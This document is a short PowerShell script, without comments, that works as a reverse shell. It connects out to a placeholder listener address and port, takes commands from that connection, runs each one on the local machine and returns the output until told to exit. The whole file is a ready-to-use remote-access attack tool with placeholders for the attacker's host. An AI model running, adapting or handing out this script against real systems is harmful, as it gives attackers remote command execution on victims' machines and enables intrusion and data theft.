$LHOST = "LHOST"
$LPORT = LPORT
$T=New-Object Net.Sockets.TCPClient($LHOST,$LPORT)
$N=$T.GetStream()
$W=New-Object IO.StreamWriter($N)
$R=New-Object IO.StreamReader($N)
$W.AutoFlush=$true

while($T.Connected){
    $C=$R.ReadLine()
    if($C -eq 'exit'){break}
    $sb=[scriptblock]::Create($C)
    $O=try{(& $sb) 2>&1|Out-String}catch{$_|Out-String}
    $W.WriteLine($O.TrimEnd())
    $W.WriteLine('<<END>>')
}
$T.Close()
